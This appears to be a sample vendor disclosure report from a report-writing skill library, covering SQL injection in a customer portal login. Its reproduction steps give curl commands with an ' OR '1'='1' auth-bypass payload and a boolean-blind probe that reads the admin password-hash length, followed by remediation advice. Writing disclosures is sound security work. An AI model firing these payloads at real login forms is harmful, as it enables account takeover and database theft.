---
description: "Example: direct vendor submission for SQL injection auth bypass on a customer portal login form"
skill: report-generation
category: Disclosure & Reporting Formats
---

**Title:** SQL injection in customer portal login allows unauthenticated database read

**Severity:** CRITICAL

**CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (9.1)

---

### Summary

An unauthenticated visitor to the customer portal's login form bypasses login and reads arbitrary rows from the accounts table. The login form concatenates the `username` field directly into the authentication query. A single payload logs in as whichever account the query returns first — on this instance, the portal administrator.

**Exploit flow**
1. An unauthenticated visitor with no account and no prior access submits a crafted `username` value instead of real credentials on the public login page.
2. The concatenated query returns the first row it matches, which is the administrator account on this instance.
3. That payload logs the visitor into the admin dashboard with no password.
4. A boolean-blind payload on the same field proves the query is a general read primitive, not just an auth-check quirk.
5. The visitor extracts arbitrary data from the accounts table one bit at a time through that oracle.

### Steps to Reproduce

1. [attacker] Send a normal login attempt to capture the baseline failure message:
```
curl -s -X POST https://portal.example.com/login \
  -d "username=nobody&password=wrong"
```
**Expect:** `"Invalid username or password."`
2. [attacker] Send the same request with a boolean payload in the username field instead of a real value:
```
curl -si -X POST https://portal.example.com/login \
  -d "username=' OR '1'='1' -- &password=anything"
```
**Expect:** 302 redirect to `/dashboard` with a `Set-Cookie` for an authenticated session, no valid credentials supplied.
3. [attacker] Confirm the query is a general read primitive, not just an auth-check quirk. Send a boolean-blind probe `OR`'d against an always-false base predicate, so the subquery — not the empty username — decides the branch:
```
curl -si -X POST https://portal.example.com/login \
  -d "username=' OR (SELECT LENGTH(password_hash) FROM accounts WHERE username='admin')=60 -- &password=x"
```
**Expect:** 302 (true branch) confirms the password hash length guess; a wrong length falls back to step 1's `"Invalid username or password."`

### Evidence

**Session minted without credentials.** Step 2's response headers:
```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=eyJhbGciOi...                                 <-- authenticated session, no valid password supplied
```

**Root cause.** The password field is parameterized; the username field is the one still built by string concatenation, which is why every payload above targets it instead.

### Impact

Unauthenticated login as the portal administrator, and full database read through the same injection point. Because the query returns whatever row it matches first, this isn't scoped to one account: any username in the table is reachable the same way.

### Remediation

Parameterize the login query — bind `username` and `password` through prepared-statement placeholders instead of string concatenation; this is the only fix, not a mitigation. Add a WAF rule blocking SQL metacharacters on the login endpoint as defense-in-depth while the code fix rolls out.

**Researcher:** Priya Natarajan — priya.natarajan@research.example
